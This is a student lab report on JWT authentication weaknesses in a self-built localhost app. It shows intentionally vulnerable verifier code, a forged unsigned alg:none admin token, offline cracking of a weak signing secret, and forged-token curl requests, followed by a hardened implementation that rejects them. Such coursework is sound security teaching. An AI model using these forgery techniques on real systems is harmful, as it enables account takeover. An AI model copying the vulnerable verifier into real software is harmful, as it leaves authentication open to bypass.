# Practical Report: JWT Authentication Vulnerability Assessment

**Module:** WEB404 Secure Coding Practices
**Practical:** 7 — JWT-based authentication system, common JWT attacks, and secure JWT handling
**Student:** Sonam Tenzin
**Date:** 2026-08-25

## Vulnerability Summary

| ID | Vulnerability | CWE | OWASP Category | Severity |
| --- | --- | --- | --- | --- |
| V1 | Signature bypass via `"alg":"none"` | CWE-347 | A02:2021 — Cryptographic Failures | Critical |
| V2 | Weak, guessable signing secret (offline crackable, enables forgery) | CWE-798 / CWE-347 | A02:2021 — Cryptographic Failures | Critical |
| V3 | No token expiry enforcement (fixed in the safe implementation; see Test 7) | CWE-613 | A07:2021 — Identification and Authentication Failures | Medium |

**A note on evidence for this report:** each browser-facing test below is backed by both a screenshot of the actual page and the underlying HTTP request/response transcript (captured with `curl` and small verification scripts). For a text-based artifact like a JWT, the raw token and decoded payload are arguably more precise evidence than a screenshot alone, so both are included together.

## 1. Objective

The purpose of this practical was to build a JWT-based authentication system from first principles (no third-party JWT library, so every step of encoding/signing/verification is visible), deliberately implement one login flow with common JWT weaknesses, demonstrate concrete attacks against it, and implement a second flow with secure JWT handling that resists the same attacks.

## 2. Ethical scope

All testing was carried out against a self-created application on `127.0.0.1` (localhost). Only a single known test account (`alice`) was used to obtain legitimate tokens; the `admin` account's real password is a random secret generated at process startup and is never displayed, logged, or used anywhere in this lab — every instance of "logging in as admin" below is achieved purely by forging a token, never by knowing or guessing the admin credential. JWT attack testing must only be performed with explicit authorisation.

## 3. Testing methodology

This assessment followed a structured black-box methodology for authentication-token testing:

1. **Baseline verification** — obtain a legitimate token through the normal login flow and confirm the protected profile endpoint accepts it (Tests 1, 6).
2. **Algorithm-confusion probing** — construct a token with an unsigned `"alg":"none"` header and a forged payload, to test whether the verifier trusts the algorithm the token itself claims (Test 2).
3. **Offline cryptanalysis** — capture a legitimate token's signature and attempt to recover the signing secret via an offline dictionary attack, without any interaction with the server (Test 3).
4. **Exploitation** — use the recovered secret to sign a new, self-chosen payload (`role: admin`) and submit it as if it were issued by the server (Test 3).
5. **Control verification** — repeat both attack payloads (`alg:none` and the weak-secret forgery) against the hardened endpoint to confirm each is independently rejected, and verify that expiry is enforced (Tests 4, 5, 7).
6. **Reporting** — document each request, the resulting token, and the server's decision, classified against CWE-347, CWE-798, and CWE-613 above.

## 4. Environment and setup

| Component | Details |
| --- | --- |
| Operating system | Windows |
| Language | Python 3.14 |
| Web server | Python `ThreadingHTTPServer` |
| JWT implementation | Hand-written HS256 encode/decode (stdlib `hmac`/`hashlib`/`base64`/`json` only, no PyJWT) |
| Application address | `http://127.0.0.1:8084` |
| Application file | `app.py` |

The lab was started with:

```powershell
python app.py
```

The server binds only to `127.0.0.1` and exposes two login flows:

- `/vulnerable-login` → `/vulnerable-profile` — signs with the weak secret `"secret"` and accepts any token whose header declares `"alg":"none"` without checking a signature at all.
- `/safe-login` → `/safe-profile` — signs with a strong random secret generated once at startup, accepts only `HS256`, verifies the signature with a constant-time comparison, and enforces the token's `exp` claim.

## 5. Vulnerability description

A JWT is three base64url segments — header, payload, signature — joined by dots. Verification is only as strong as the code that checks the signature. The vulnerable decoder does two unsafe things:

```python
alg = str(header.get("alg", "")).lower()
if alg == "none":
    # BUG: an unsigned token is accepted outright, no signature checked at all.
    return payload, None
...
expected_sig = hmac.new(WEAK_SECRET.encode(), signing_input, hashlib.sha256).digest()
if actual_sig == expected_sig:   # BUG: weak secret, and a non-constant-time compare
    return payload, None
```

Because the *token itself* declares which algorithm to use, and the vulnerable code blindly trusts that declaration, an attacker can simply set `"alg":"none"` and supply an empty signature — there is nothing left to forge. Separately, because the fallback signing secret is a short, common string, anyone who obtains one legitimately-issued token can recover that secret offline (no rate limiting, no network interaction with the server) and then sign an arbitrary payload of their choosing.

## 6. Test results

![Figure 0: Home page listing both login flows](assets/test1_home.jpg)

### Test 1: Baseline — legitimate login and profile access

![Figure 1a: Vulnerable login form, prefilled with alice's credentials](assets/test1_vulnerable_login_form.jpg)

```
$ curl -s -d "username=alice&password=orchid-47" http://127.0.0.1:8084/vulnerable-login
```

Issued JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InN0dWRlbnQiLCJpYXQiOjE3ODc2NDY5OTl9.YQTy1lEUfpz5a53vlsBj5vwIkYvHVI0F_d_PrEhRhHg
```

![Figure 1b: Vulnerable login result showing the issued JWT](assets/test1_vulnerable_login_result.jpg)

```
$ curl -s "http://127.0.0.1:8084/vulnerable-profile?token=<token above>"
```

Response:
```
Authenticated as alice (role: student).
Decoded payload:
{
  "username": "alice",
  "role": "student",
  "iat": 1787646999
}
```

![Figure 1c: Vulnerable profile page showing the decoded, verified payload for alice](assets/test1_vulnerable_profile_baseline.jpg)

This confirmed the login and token-verification flow worked correctly before any attack was attempted.

### Test 2: Signature bypass via `"alg":"none"`

A token was hand-built with no cryptographic material at all — just a header claiming `"alg":"none"` and a payload claiming to be the admin account:

```python
header  = {"alg": "none", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}
token   = b64url(header) + "." + b64url(payload) + "."   # empty signature segment
```

Resulting token:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

```
$ curl -s "http://127.0.0.1:8084/vulnerable-profile?token=<token above>"
```

Response:
```
Authenticated as admin (role: admin).
Elevated to admin.
Decoded payload:
{
  "username": "admin",
  "role": "admin"
}
```

![Figure 2: The vulnerable profile page accepts the unsigned alg:none token and shows "Elevated to admin"](assets/test2_none_alg_admin_elevation.jpg)

| Item | Observation |
| --- | --- |
| Vulnerability type | JWT algorithm-confusion / signature bypass (`alg:none`) |
| Result | Full impersonation of the admin account with zero knowledge of any credential, and no cryptographic material presented at all. |

### Test 3: Offline secret cracking and token forgery

A legitimate token for `alice` (captured from Test 1) was attacked offline — entirely without contacting the server — by trying a short list of common JWT secrets against the token's own signature:

```
Captured token (from a legitimate alice login):
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InN0dWRlbnQiLCJpYXQiOjE3ODc2NDY5OTl9.YQTy1lEUfpz5a53vlsBj5vwIkYvHVI0F_d_PrEhRhHg

Trying candidate secrets against the captured signature:
  '123456'     -> no match
  'password'   -> no match
  'secret'     -> MATCH

Cracked secret: 'secret'
```

With the secret recovered, a brand-new token was signed from scratch, claiming the admin role:

```
Forged admin token, signed with the cracked secret:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0._8exKepVtGt64GYgSb71H2GiacV9S7iVOdTmk5mQsB4
```

```
$ curl -s "http://127.0.0.1:8084/vulnerable-profile?token=<forged token above>"
```

Response:
```
Authenticated as admin (role: admin).
Elevated to admin.
Decoded payload:
{
  "username": "admin",
  "role": "admin"
}
```

![Figure 3: The vulnerable profile page accepts the forged, weak-secret-signed token and shows "Elevated to admin"](assets/test3_cracked_secret_admin_elevation.jpg)

| Item | Observation |
| --- | --- |
| Vulnerability type | Weak/hard-coded signing secret → offline dictionary attack → arbitrary token forgery |
| Result | Admin impersonation using a self-chosen payload, signed with a secret recovered entirely offline from one captured token. |

### Test 4: `"alg":"none"` attack rejected by the safe endpoint

The identical unsigned token from Test 2 was submitted to the hardened endpoint:

```
$ curl -s "http://127.0.0.1:8084/safe-profile?token=<same alg:none token as Test 2>"
```

Response:
```
Rejected: algorithm 'none' is not permitted; only HS256 is accepted
```

![Figure 4: The safe profile page rejects the alg:none token](assets/test4_safe_rejects_none_alg.jpg)

The safe decoder pins the expected algorithm itself rather than trusting the token's own header, so an attacker cannot simply declare their way past verification.

### Test 5: Weak-secret forgery rejected by the safe endpoint

The identical forged admin token from Test 3 (signed with the cracked secret `"secret"`) was submitted to the hardened endpoint:

```
$ curl -s "http://127.0.0.1:8084/safe-profile?token=<same forged token as Test 3>"
```

Response:
```
Rejected: invalid signature
```

![Figure 5: The safe profile page rejects the forged token signed with the cracked weak secret](assets/test5_safe_rejects_forged_signature.jpg)

Because the safe endpoint signs with a strong, randomly generated secret that is never derived from a dictionary word and is unrelated to the weak secret used elsewhere, the forged signature does not match and the token is rejected.

### Test 6: Safe baseline — legitimate login and profile access

![Figure 6a: Safe login form, with the added token-lifetime field](assets/test6_safe_login_form.jpg)

```
$ curl -s -d "username=alice&password=orchid-47&ttl=300" http://127.0.0.1:8084/safe-login
```

Issued JWT (note the added `exp` claim):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InN0dWRlbnQiLCJpYXQiOjE3ODc2NDcwNzAsImV4cCI6MTc4NzY0NzM3MH0.v0Fg1gzllDYh9B2PUxYKipy803rKM2jJM1zl-lD0WXw
```

![Figure 6b: Safe login result showing the issued JWT](assets/test6_safe_login_result.jpg)

```
$ curl -s "http://127.0.0.1:8084/safe-profile?token=<token above>"
```

Response:
```
Authenticated as alice (role: student).
Decoded payload:
{
  "username": "alice",
  "role": "student",
  "iat": 1787647070,
  "exp": 1787647370
}
```

![Figure 6c: Safe profile page showing the decoded, verified payload including exp](assets/test6_safe_profile_baseline.jpg)

This confirmed the safe flow works correctly end to end for a legitimate user.

### Test 7: Expired token rejected by the safe endpoint

A token was issued with a 1-second lifetime (`ttl=1`), and the request to view the profile was deliberately delayed by 2 seconds:

```
$ curl -s -d "username=alice&password=orchid-47&ttl=1" http://127.0.0.1:8084/safe-login
$ sleep 2
$ curl -s "http://127.0.0.1:8084/safe-profile?token=<token from above>"
```

Response:
```
Rejected: token expired
```

![Figure 7: The safe profile page rejects a token past its own exp claim](assets/test7_safe_rejects_expired_token.jpg)

| Item | Observation |
| --- | --- |
| Vulnerability type | Missing expiry enforcement (vulnerable endpoint never checks `exp` at all) |
| Result | The safe endpoint correctly rejects a token past its stated lifetime; the vulnerable endpoint has no equivalent check and would accept the same token indefinitely. |

## 7. Security impact

The findings show what weak JWT handling exposes:

- **Complete authentication bypass** — the `alg:none` attack requires no secret, no credential, and no cryptography at all; only knowledge that the endpoint exists.
- **Full account/privilege forgery** — a weak signing secret is a single point of failure: once recovered offline (which requires no interaction with the live server and therefore cannot be rate-limited or detected), an attacker can mint tokens for any user or role, indefinitely.
- **Indefinite session validity** — without expiry enforcement, a stolen or forged token remains valid forever, removing any natural limit on the damage window.
- **Silent exploitation** — none of these attacks touch the database, trigger errors, or require multiple guesses against the server; a dictionary attack against a captured token happens entirely offline and leaves no trace on the target.

## 8. Mitigation and verification

The `/safe-profile` endpoint applies three independent controls:

```python
if header.get("alg") != "HS256":
    return None, f"algorithm '{header.get('alg')}' is not permitted; only HS256 is accepted"
...
if not hmac.compare_digest(actual_sig, expected_sig):
    return None, "invalid signature"
...
if "exp" not in payload or int(time.time()) >= payload["exp"]:
    return None, "token expired"
```

- **Server-side algorithm pinning** — the verifier decides which algorithm is acceptable; it never trusts the `alg` field inside the token being verified, which closes off the `alg:none` and algorithm-confusion class of attacks entirely.
- **Strong, random signing secret** — `secrets.token_hex(32)` generated once at process startup (256 bits of entropy), rather than a short dictionary word, making offline cracking computationally infeasible.
- **Constant-time signature comparison** — `hmac.compare_digest` avoids leaking information about how close a forged signature is through timing differences.
- **Mandatory expiry check** — every safe token carries an `exp` claim, and the verifier rejects anything at or past that time, bounding how long a compromised token remains useful.

Tests 4, 5, and 7 verified each control independently: the exact `alg:none` payload and the exact weak-secret-forged payload that succeeded against the vulnerable endpoint were both rejected by the safe endpoint, and a token past its own stated expiry was rejected even though its signature was otherwise valid.

**Replication steps**

1. Start the server with `python app.py`.
2. `curl -s -d "username=alice&password=orchid-47" http://127.0.0.1:8084/vulnerable-login` and note the issued token.
3. Build an `alg:none` token for `admin` as shown in Test 2 and submit it to `/vulnerable-profile`; observe admin impersonation.
4. Run the cracking script in Test 3 against the token from step 2 to recover the secret, forge an admin token, and submit it to `/vulnerable-profile`; observe admin impersonation again via a different technique.
5. Submit both forged tokens to `/safe-profile` instead and observe both are rejected.
6. Log in via `/safe-login` with `ttl=1`, wait a few seconds, and submit that token to `/safe-profile`; observe the expiry rejection.

Recommended defenses for a production JWT implementation are:

- Never let the token itself dictate which algorithm or key the verifier should use; pin the expected algorithm server-side.
- Use a signing secret (for HMAC) or key pair (for RSA/ECDSA) with sufficient entropy, generated by a cryptographically secure random source, never a short string or default value.
- Always verify the signature with a constant-time comparison.
- Always set and enforce an `exp` claim with as short a lifetime as the application can tolerate, and consider a refresh-token flow for longer sessions.
- Prefer a well-reviewed JWT library over a hand-rolled implementation in production; this lab implements JWT from scratch purely so every verification step is visible for the assessment.

## 9. Module concepts applied

| Module topic | How it was applied |
| --- | --- |
| 5.8.1 JWT structure and vulnerabilities | Demonstrated by hand-constructing and decoding the header/payload/signature structure throughout |
| 5.8.2 JWT signature bypasses | Demonstrated in Test 2 (`alg:none`) and Tests 3/5 (weak-secret forgery) |
| 5.8.3 Secure JWT implementation | Demonstrated in Section 8 (algorithm pinning, strong secret, constant-time comparison, expiry) |
| 2.6.1 Authentication bypass techniques | The `alg:none` attack is a direct authentication bypass requiring no credential |
| 2.6.3 Secure authentication practices | Reflected in the safe login flow's token lifetime control and expiry enforcement |

## 10. Conclusion

The practical demonstrated two independent ways to fully impersonate an administrator account without ever knowing its password: declaring `"alg":"none"` to skip signature verification entirely, and cracking a weak signing secret offline from a single captured token to forge new ones at will. Both attacks succeeded completely against the vulnerable implementation and were both rejected outright by the safe implementation, which pins the algorithm server-side, signs with a strong random secret, compares signatures in constant time, and enforces token expiry. The token's own header can never be trusted to say how it should be verified — that decision belongs entirely to the server.

## References

- OWASP Foundation. *JSON Web Token (JWT) Cheat Sheet for Java*. owasp.org. (Principles apply to any JWT implementation, not only Java.)
- MITRE. *CWE-347: Improper Verification of Cryptographic Signature*. cwe.mitre.org.
- MITRE. *CWE-798: Use of Hard-coded Credentials*. cwe.mitre.org.
- MITRE. *CWE-613: Insufficient Session Expiration*. cwe.mitre.org.
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws*. John Wiley & Sons.

## Appendix: Running and cleanup

Start the lab with `python app.py`, then browse to `http://127.0.0.1:8084`. Stop the server with `Ctrl+C`. All state (users, secrets) is held only in memory and is reset whenever the application restarts.
